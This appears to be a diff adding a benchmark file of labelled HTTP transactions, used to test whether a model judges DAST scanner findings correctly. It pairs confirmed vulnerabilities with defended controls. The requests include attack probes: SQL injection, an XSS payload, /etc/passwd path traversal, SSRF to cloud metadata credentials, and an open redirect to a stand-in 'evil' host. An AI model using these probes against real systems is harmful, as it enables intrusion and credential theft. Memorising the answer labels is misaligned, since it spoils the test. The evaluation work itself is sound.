@@ -1,0 +1,192 @@
+# Labeled HTTP transactions — the judgement a DAST agent makes after it has
+# already sent the traffic: given this request and this response, is the finding
+# real, and which weakness is it?
+#
+# This isolates reasoning from browser mechanics on purpose. Crawling, auth and
+# payload delivery are the agent's job; deciding whether a 500 with a SQL error
+# is exploitable is the *model's* job, and that is what gets scored here.
+#
+# `cwe: null` marks a SAFE control — a probe that was correctly defended. Those
+# are the cases that catch a model which calls every non-200 a vulnerability.
+
+# ---------------------------------------------------------------------------
+# Confirmed vulnerabilities
+# ---------------------------------------------------------------------------
+
+- id: dast-sqli-01
+  cwe: CWE-89
+  name: Error-based SQL injection
+  request: |
+    GET /api/products?category=electronics%27 HTTP/1.1
+    Host: shop.example.test
+    Cookie: session=eyJ1aWQiOjQyfQ
+  response: |
+    HTTP/1.1 500 Internal Server Error
+    Content-Type: application/json
+
+    {"error":"You have an error in your SQL syntax; check the manual that
+    corresponds to your MySQL server version for the right syntax to use near
+    \"'electronics''\" at line 1"}
+
+- id: dast-xss-01
+  cwe: CWE-79
+  name: Reflected XSS, unencoded
+  request: |
+    GET /search?q=%3Csvg/onload%3Dalert(1)%3E HTTP/1.1
+    Host: shop.example.test
+  response: |
+    HTTP/1.1 200 OK
+    Content-Type: text/html; charset=utf-8
+
+    <html><body><h2>Results for <svg/onload=alert(1)></h2>
+    <p>No products matched.</p></body></html>
+
+- id: dast-idor-01
+  cwe: CWE-639
+  name: IDOR — another user's record returned
+  request: |
+    GET /api/invoices/8815 HTTP/1.1
+    Host: shop.example.test
+    Cookie: session=eyJ1aWQiOjQyfQ
+  response: |
+    HTTP/1.1 200 OK
+    Content-Type: application/json
+
+    {"invoice_id":8815,"user_id":91,"email":"margaret.ellison@example.test",
+    "total":"412.90","card_last4":"4417"}
+
+- id: dast-authz-01
+  cwe: CWE-306
+  name: Admin endpoint with no authentication
+  request: |
+    GET /admin/users HTTP/1.1
+    Host: shop.example.test
+  response: |
+    HTTP/1.1 200 OK
+    Content-Type: application/json
+
+    {"users":[{"id":1,"email":"root@shop.example.test","role":"admin"},
+    {"id":2,"email":"ops@shop.example.test","role":"admin"}]}
+
+- id: dast-path-01
+  cwe: CWE-22
+  name: Path traversal returning a system file
+  request: |
+    GET /download?file=../../../../etc/passwd HTTP/1.1
+    Host: shop.example.test
+  response: |
+    HTTP/1.1 200 OK
+    Content-Type: application/octet-stream
+
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+
+- id: dast-ssrf-01
+  cwe: CWE-918
+  name: SSRF reaching cloud instance metadata
+  request: |
+    POST /api/preview HTTP/1.1
+    Host: shop.example.test
+    Content-Type: application/json
+
+    {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
+  response: |
+    HTTP/1.1 200 OK
+    Content-Type: text/plain
+
+    shop-app-instance-role
+
+- id: dast-redirect-01
+  cwe: CWE-601
+  name: Open redirect to an external host
+  request: |
+    GET /login?next=https://evil.example.net/harvest HTTP/1.1
+    Host: shop.example.test
+  response: |
+    HTTP/1.1 302 Found
+    Location: https://evil.example.net/harvest
+    Content-Length: 0
+
+- id: dast-errdisc-01
+  cwe: CWE-209
+  name: Stack trace disclosing internals
+  request: |
+    GET /api/orders?limit=abc HTTP/1.1
+    Host: shop.example.test
+  response: |
+    HTTP/1.1 500 Internal Server Error
+    Content-Type: text/html
+
+    <pre>Traceback (most recent call last):
+      File "/srv/shop/api/orders.py", line 88, in list_orders
+        limit = int(request.args["limit"])
+    ValueError: invalid literal for int() with base 10: 'abc'
+    Django 4.2.1, DEBUG=True, DB=postgres://shop_rw@10.0.3.14:5432/shop</pre>
+
+# ---------------------------------------------------------------------------
+# Safe controls — probes that were correctly defended.
+# A finding on any of these is a false positive.
+# ---------------------------------------------------------------------------
+
+- id: dast-safe-01
+  cwe: null
+  name: SQLi probe rejected by validation
+  request: |
+    GET /api/products?category=electronics%27 HTTP/1.1
+    Host: shop.example.test
+  response: |
+    HTTP/1.1 400 Bad Request
+    Content-Type: application/json
+
+    {"error":"invalid_parameter","field":"category",
+     "detail":"category must be one of: electronics, books, garden"}
+
+- id: dast-safe-02
+  cwe: null
+  name: XSS payload reflected but HTML-encoded
+  request: |
+    GET /search?q=%3Csvg/onload%3Dalert(1)%3E HTTP/1.1
+    Host: shop.example.test
+  response: |
+    HTTP/1.1 200 OK
+    Content-Type: text/html; charset=utf-8
+
+    <html><body><h2>Results for &lt;svg/onload=alert(1)&gt;</h2>
+    <p>No products matched.</p></body></html>
+
+- id: dast-safe-03
+  cwe: null
+  name: IDOR attempt correctly denied
+  request: |
+    GET /api/invoices/8815 HTTP/1.1
+    Host: shop.example.test
+    Cookie: session=eyJ1aWQiOjQyfQ
+  response: |
+    HTTP/1.1 403 Forbidden
+    Content-Type: application/json
+
+    {"error":"forbidden","detail":"invoice does not belong to the current user"}
+
+- id: dast-safe-04
+  cwe: null
+  name: Redirect target restricted to same origin
+  request: |
+    GET /login?next=https://evil.example.net/harvest HTTP/1.1
+    Host: shop.example.test
+  response: |
+    HTTP/1.1 302 Found
+    Location: /dashboard
+    Content-Length: 0
+
+- id: dast-safe-05
+  cwe: null
+  name: Traversal attempt blocked, generic error
+  request: |
+    GET /download?file=../../../../etc/passwd HTTP/1.1
+    Host: shop.example.test
+  response: |
+    HTTP/1.1 404 Not Found
+    Content-Type: application/json
+
+    {"error":"not_found"}
